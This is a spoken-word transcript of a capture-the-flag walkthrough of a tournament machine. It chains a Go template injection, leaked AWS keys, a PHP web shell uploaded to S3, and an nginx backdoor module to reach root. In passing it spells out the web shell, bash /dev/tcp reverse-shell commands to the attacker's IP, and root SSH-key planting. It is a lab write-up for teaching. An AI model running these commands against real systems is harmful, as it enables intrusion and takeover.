 what's going on youtube this is ipsec be doing a impromptu video for an impromptu machine i created for the uhc august finals that is ultimate hacking championship it's a 10 minute that runs twice a week the first week of the month is going to be the qualifier round where the top 10 people compete in a live streamed event on twitch with commentators talking over what they do and the winner of the monthly tournament qualifies for a bigger event sometime in 2022 with all the other champions but since i created this machine i decided i do a video on it on the typical ipsec fashion of just explaining my thought process and how i'd go enumerate each of these things and if you want to play along with the challenge it is also going to be hosted on the hack the box platform so you can just spin it up as you would any other machine that being said the machine does have a go link ssti that gets you shell on a docking container that has some aws configurations that lets you upload to s3 buckets looking at them you can find another website is hosted out of s3 so upload a php shell there get a shell on that box which then enumerating the host reveals an nginx backdoor that once you exploit it gets root let's just jump in and do this thing as always i start off the end map so i'm going to create the directory and map and then we do dash p to do all ports dash v so we show open ports as we find them oh hey i'll put all formats bring the nmap directory and call it all ports and then the ip address of 192 168 30.13 and it should be noted that normally when i do hack the box machines i do a dash dash min dash rate of like 10 000 packets per second but if you're doing these uhc tournaments it is in aws and i've had bad experiences when sending that many packs at once so i wouldn't recommend using that flag in this instance we do see it returns four ports so we have 22 80 45 66 and 80 80. so i'm going to run a second end map and we're going to set those ports 80 45 66 and 8080 and then we want to do dash sc for default scripts sv enumerate versions oh a output all formats and put in the uhc directory and let this one go it may take a little while to run so let's just go take a look at the website so 192.168.30.133 is what i said and we get a page that just says hacking esports the next person to qualify will be announced shortly who will join the first person to qualify and then it has a list of all the players so the very first thing i want to do here is just check like index.html and try to guess what extension this web server uses there is a index.html file and it just says test we can try like php and we get a page here so chances are this web server is running php so when we run a go buster now we want to specify the php extension so go buster dir w for word list opt set list discovery web content raft small words dot text specify the php extension and the output file of just go buster.out and while that runs we can oh i forgot the url flag uh probably the most important one dash u http uh 192 168 30.133 so while that runs we can take a look at the nmap so cat and map and then what was it uhc.nmap we have four ports so ssh this is running ubuntu we have engine x um 4566 returns a forbidden page and then if we go just to http on port 8080 we have another page so i'm going to check this one it looks like it's different because this is hacking esports homepage and this has a screwed up ssti as bracket bracket.title bracket bracket which i left there as a hint because the next piece of this box is going to be ssti and the unique thing about this is it's going sti which is odd and it's probably in a place i'm not used to seeing but because i only have like a week to create this box and like that includes testing and everything i just did what is easy but enough of meting this thing let's just go test it how we normally would the first thing i do is probably like a basic sql injection on the login field and see what happens when you click login it wants an email address so i'm just going to go right ahead and send this to prep suite a at b.com make sure intercept is on it is login put in the repeater tab send it to see what we have we probably should try just blank things we have 1932 bytes if i put this sql injection 1932 we can put it in here as well 1932 and for good measure we can just url encode it in case that's an issue but never get anything more than 1932. i could copy this to a file and then start sql mapping in the background but not going to bother doing that because i know that it will lead to nowhere other than wasting your time of watching me do it if you ever have questions you can go to ipsec.rocks and just like type a few things and find the video irrelevant in video so sign in let's try the same thing here so at b.com i don't know why i turned intercept off because we just got to do it right again going to burp suite this one is not or this one is not on the page so we can drop that this is on the get this one is a post and has the email this is a request we want so we can send it and we see email sent to aab.com we could for the request to see what it says right there and if we do a lot of like sql injection here we'll get nowhere as well if i put a single quote and then like this we can see it's actually displaying that and also doing the encoding so cross-site scripting won't work we can put other characters in there and see all these are html nd encoded and it's weird this one is saying um actually i don't understand this about the girling web server we have ampersand greater than for this and then this one is ampersand less than and it's actually escaping the ampersand in the html encoding itself so it's like double encoding this one character if we look at the header though we have this exported server tag and it's telling us that this server is going so if we do a lot of fuzzing on this the girling hint's going to be nice so we can try fluff and this one isn't going to work right away we have to do some manly tweaking which is kind of why i like using w fuzz but i'm going to show this anyway so you guys can see kind of like where my thought logic goes but let's do this url so http slash forgot like this dash w for word list and we can do opt set uh fuzzing special characters.txt and then dash u oh we already did that uh we need to do dash d for data and we can say email is equal to fuzz now everything is returning 14.97 and it's actually should be if we look at burp suite bigger than that uh because it's echoing everything out if we just do one character it's actually 1678 with just one i'm not sure where it's getting 1497 from if we let's see let's just do a get request real quick so forgot 1662. not sure so the size isn't matching up with what burp says however uh the one thing we did forget in um is the header tag or the host we've got to put content type and this is incredibly important whenever doing um what is it when doing post request so content type right here this is what i was trying to say so this tag is always important when doing post requests and we can see now we have varying size 1497 still for semicolon moster 1498 we have a 1502 so we can say filter size 1498 because we kind of just want to ignore those and we get all these html and the encoding ones we can try fuzz fuzz to do two special characters and we now have to exclude 1499 because the payload grew in one size but we don't get anything else here and this is my other complaint with fuff is the response status it's not matching any 500 errors so if you're just using fuff and don't do this other tag where is match is it like a match all od let's see let's see match hpss so dash mc all so if it by default matched everything uh matcher all 14.99 we get on um the open bracket it's a 502 error now if we used w fuzz instead of w fuzz like this special characters email fuzz fuzz we can get rid of all of this and we'll just say hide words 97 it's dash dash and wfus and it becomes much more apparent where that error is so that's kind of why i like using w fuzz because it just has a lot less arguments that are required at times so when we do dash dash it gives a bad gateway and if we do research on girling ssti there's going to be the first two results which are pretty much the only pages about this that i could find become very important so this first one and then the second and finally enough this first one references the second so these two are the same page because this one came first and it's talking about doing cross-site scripting in gerlang's engine but the key thing it does is tell you to try this payload so open bracket open bracket period close close and when you do sstis or when you create like templates um like this is how you escape the html at the end of the video i'll try to remember to go back over and look at how the template works but when you do this now you're back into the parameters passed to the html file from your language so you could say include a variable like dot password and that's what that one blog post is saying whenever you see this um and templating languages think um period is really a dollar sign so that may make more sense at the end of the video when we go over it but we can try that with this email and then we go down and we can see email is sent to ipsec at hacking.esports and then this password so we can try logging into the page so let's go back to just slash and we can say ipsec at hacking dot esports put the password in and we have go link source code now if you read this second post it really talks about um let's see upon experimenting i was wondering if you could equally call methods through templin injection and his is using system id and i think there's a typo in this blog post because in order for this to work it's kind of like finding a gadget and php deserialization or any deserialization you have to use a function name and in their example they're giving it secret but in like the payload they're giving it system which i think is a little bit confusing but this is what you're looking for and if we go to the source code we can see it's got a similar thing instead of secret or system i called it debug cmd and it's got a little more functionality because in this code all it was doing was a single binary and i was giving it the option to do a binary and arguments but ideally if we do debug cmd we'll be able to get a reverse shell so debug cmd id and we have email sent to root which is awesome we can try things like ping and everything but this is going to be a docker container and the default ubuntu dock container actually doesn't have all these binaries which makes it really tough to get a reverse shell additionally there is a firewall on this box that we'll find out where reverse shells just aren't possible so you could use a forward shell but in a timed event i wouldn't recommend setting one up i'd just be like you know what we'll just deal with this but all the binaries that you generally use just don't exist let's see if nc exists yeah even nc doesn't exist in bash though you can do a basic port scan and whenever like testing out payloads i like testing it on a machine that i own first because standard outer standard error things like may not get displayed when you're doing it through a web shell in this case because the source code has this combined output thing we capture both standard out and standard error but and best rule of practice test commands on the box you own so i'm going to try echoing something to dev tcp 192.168.30.133 port 8080 and all this does is open a connection and bash this automatically gets translated like it's a file but it tells bash to go to a web like a tcp socket so we can say and and echo up and if we do a port that doesn't exist it's going to error out so we could also do or echo down and if we really want to we could say standard error to dab null so we hide those errors i thought that was it is it in i thought that would yeah i'm not sure exactly how to hide the standard error but we have a basic port scanner so we can try this command on our web shell so if i paste this we have to url and code this and send it it says it's up of course it can talk to itself but if i try to change the ip to myself so let's see nclvmp8080 i can't listen because that's burp suite let's just do 9001 and go back here uh what was my ip 129. so 30.129 9001 it hangs indefinitely which looks like we're getting a shell but over here we have no connection so you have to or you should be doing everything through this little webshell you could create a quick python app and like the cmd library or just go through burp suite which is fine enough for this so putting hostname we see the email is sent to aws so the hostname of this box is aws which is indicator that was supposed to use aws for something we can check if the aws cli is installed in the box which it is furthering oh this is a aws challenge also if we do lsla on our home directory there's a dot aws directory and if we go into that let's see aws like this there is a credentials file so if we cut this oh shoot aws credentials that was my like burp suite timing out finally of that very first like port scan i did so we have the secret id and secret access so we could copy these to our local machine and then access the um s3 from our local machine so at this point we could get out of the reverse shell if you didn't see that file it is also a environment variable so there's plenty of ways you could enumerate these keys but you don't have to install the aws cli on your local box because we have it on this so if i do aws s3 api list buckets we can see there are a few buckets here and we have this html entity encoding so if i copy this send it over to decoder do smart decode we can see the bucket its name is website so if we want to interact with that we can do s3 ls and we can also list buckets by s3 colon slash which tells us website and if we look at this we have a few files uh css bottom.png header.png index.html which is five if you remember at the start of the video that just says test and then probably has a line break so that would be five characters index.php so we can try writing a php script to this server so we should do echo php system request ipsec like this if we echo this we probably want to base 64 encoder because this has a lot of special characters we need to um have two different types of quotes and our like way we execute code uses one type of quote so instead of dealing with like escaping quotes i find it easier just to base 64. and i just noticed something here we have this dollar underscore request and it didn't print it out so i probably should go back and escape that yep there we go so now when i base 64 that looks better so we can copy this go back to our shell and we want to create a file so echo dash n paste this base64-d test this out so we make sure that um we have like the ability to use pipes because we haven't done that yet actually we did in the port scan but that looks fine i mean it looks ugly because it's html endy encoded we could direct it to a file so temp we'll just call it please subscribe and sent there so let's try catting it and we have this the one thing i'm curious about is if this html any coding happened when the server first saw it or when it's on its output because if the file has this obviously it's not going to work and we're going to have to try some other encodings so i'm gonna cut this to base64 and we're just going to sanity check that doesn't have any html nd encodings because this doesn't have that ampersand of course the base64 doesn't show it so base64-d everything is lining up so we can now try to cap this file actually copy the file name and we want to go back to aws and we'll do s3 cp this file to s3 website and we got to call it something so we'll call it um totes legit.php shout out to rook from his old shell name but we see it copied 38 bytes and if we just copy this go to slash totes legit.php looks like it's a file we can do question mark ipsec equals ls and boom we have code execution so the next step is to get a reverse shell so let's turn intercept on nc lvmp 9001 go to repeater uh proxy let's see send it to proxy send this to repeater i'm gonna do bash dash c bash dash i dev tcp 192 168 30.129 i believe ipaddr 129 slash port 9001 0 and 1 single quote and let's convert this whole thing into um html and the url encoding whatever the default for control u is send it we're not getting a response back which looks good and we have a show on the box so let's get a reverse shell or not reversal proper tty because right now if i do tabs or doesn't work and control c will kill my shell so doing this next step will allow us to do everything we want except is the server hanging send oh get ipsec equals let's see ls okay that works okay i must have put like a line break or something but fix our shell quickly enough import tv to y p t y dot spawn then bash then ctrl z stty raw minus echo f g enter enter and now we have a like tab auto complete and control c i'm going to do export terms equal to x term so we can clear the screen and we can poke around at this website looking at this we don't have any like configuration files where we could look at mysql looking at the output we don't even see mysql listening which is a bit unique for a web server no database but the database could be on a different server or anything but the one thing that's standing out to me we have these ports 9000 9001 which did show up in our nmap so if we look at nmap less nmap uhc dot nmap uh let's do all ports dot let's see less and map all ports dot nmap we can see they're here but they are filtered so there's an ip tables rule blocking these ports most likely going back to the reverse shell there's also something listening on localhost 8000 which is interesting so if we do a ps ef we can see a program called main is being ran there's reverse shell um we have docker engine x so the first thing i do is like a docker ps and we don't have permission to talk to docker because we're not in the docker group but we can look at the nginx configuration so etsy engine x sites enabled and we can just look at default and we have a few things so i see it's passing it to localhost 9000 and 4566 this is the default port for application called local stack which is like the aws uh emulation and that's how the s3 command worked earlier it was going to this server we can see it's open globally on 4566 and just passing things to 9000 and requires this key and this is actually the secret key um and this is a like nasty hack because local stack itself doesn't have any authentication it just accepts any type of key so i set up a reverse proxy with engine x and require the host header to have the key so that way if you got a shell on the box and leaked the key you had a way to actually use the key and people couldn't just go oh local stack is installed okay let me go get a like s3 something so that was just a nasty hack for that we have port 80 this is going to php fpm sock so this is just engine x executing php then 8080 this is the go lane thing and then localhost we have command on and this is where it gets interesting i don't know what that command on parameter is so let's go to google and say uh burp suite go away let's do command on semicolon and engine x and looking through this i don't see anything that references that config option if i specify github with this as well we get a link here which is nginx execute and it's talking about a backdoor and it says view source we can actually copy this curl command system run command and if we try this it's unfortunately not going to work because it's not that easy and looks like this is enough characters where it screws up my terminal the downside to some reverse shells once you hit like the limit it wraps back so let's fix our tty i'm gonna go to this pane stty dash a i want 35 rows and 136 columns so here stty dash a rows 35 columns 136. uh i don't want dash a i just want that there we go and now i have the correct wrapping so we can go back to this copy the command and change this to be 127.001 port 8000 and run the command id and we just get empty reply from server doesn't look like it worked so let's go investigate this it is a engine x module and modules are installed in user local uh user share nginx i think there we go modules and if we do a grappler strings on the http execute module which is the name of this and grep for run we can see there is a string ipsec.run so really quickly we can probably get idea we can do ipsec.run and id let's see ipsec run and we are root so that is how you do this box if you do ls dash la slash root to confirm yep we would be i don't have any flags here yet so nothing special but that is the box um i did want to show you the ssti thing so if i go to opt let's see if i can find it real quick so off the website is where the golan code is and if we actually this is not the go link code it's in docker which we have to get to root with let's see curl we can let's see best way to do this chmod plus or we'll do four seven seven seven on which vim do i have them on this the lsla now on vim it's pointed to etsy alternatives which is pointed to basic this is getting more annoying by the minute okay i did give it a special privilege bit so what i was doing here was setting the set uid on vim so i can quickly execute to root i thought that would work i wonder if vim basic doesn't have the set uad capability user ben vim.basic uh let's do chmod 477 bim bash id so that's not working that's not only my go-to way to um escalate if i can just do bash after apply um we can see i wonder if there's no way this will work bash dash i devtcp 168 30 129 9001 i really don't expect this one to work but kind of want to try it just to see if the shell is capable of that it does work that is actually surprising to me i didn't think the engine x module would handle everything like it did bash i looks like we only have one command though unless i screwed up that payload pwd yeah i think the engine x is timing out so let's try do i have no hop on this no hop will this work now for multiple commands it does oh no still times out so let's just put a ssh key on the box so um ssh keygen dash f test cat test.pub we can echo this to a file so echo two slash root dot ssh authorized keys and then we probably should chmod 600 that file chmod 600 root.ssh authorized keys chmod 600 test dash i test root at 192 168 30. 133 there we go finally we are root here so if we wanted to look at the go application or the go configuration we can do docker exec it 3f i'm just pulling it from the container name and we don't have to specify the whole thing just what makes that one unique and minimum of two characters and sh so now we're in shell on that container so we go to opt uhc this is where the go program is here is main if we go into templates we have these html files and if i do let's see forgot don't have v here cat see do i use this at all yeah so anytime you see these parameters it is passing it from the go application the variable so here it's pulling the body so you can notice every time it's pulling something it's a period first if i go back here and we do that period it's pulling everything here and this is using um id username and password so if i do username uh maybe it's user i don't know why i called that field it's um person maybe email there we go just the email if i go back to password it'll say just the password but specify nothing it outputs everything so going back to i don't have the source code anymore let's go back you can see where that field gets created then i will end the video so ipsec i don't think that's the password ipsec let's go to burp suite it's ip secret password the person where is it there we go the structure id email password and there was one last thing i actually wanted to do as i was showing all this i haven't opened this before in geeja but let's open up the nginx module so let's go to user share engine x modules python3 dash mhttp server with some import 8001 and let's download this bot file to our box and then open up engine to see it so wget 192 168 30. 133 8001 follow downloaded let's open up ghidra hedo run close we have to create a new project open this input the file so i'm pushing a go to this module it is a l file i believe and let it parse this analyze yes okay so now we are in gija we can look at the imports nothing really there exports is what we kind of want and we can begin looking at all the functions this engine execute looks interesting going here i see it doing a p open but i don't see where this [Music] like where is checking for ipsec dot run so the quickest way is to look at strings so let's see search for strings let's search everything let's do all blocks and i'm just going to search for ipsec and we have it here so we can see its cross references which is where this string is used is in this nginx http execute handler we could try finding it over here or just like click to we get here ipsec run i don't think that was it actually no that is it this is just the assembly look at the decompiled output and we can see let's see if i highlight this maybe it's pulling it there let's see oh right here so this load effective address is right here so it's loading ipsec.run and then doing some comparison somewhere person command url decode command result and then passing it to nginx execute and then we go here this is where it does that p open command so nginx execute is where it executes the uh command but in order or before nginx execute gets called it's in this engine execute handler but yeah so hopefully that helped you i know i ran through that box pretty quickly but this was kind of a last-minute thing i did and i want to put a walkthrough of a box i made because i enjoyed making it and maybe if this gets a lot of views or whatever i'll try to like show the workflow i used to create this box but that'll be it for now take care guys and i will see you all later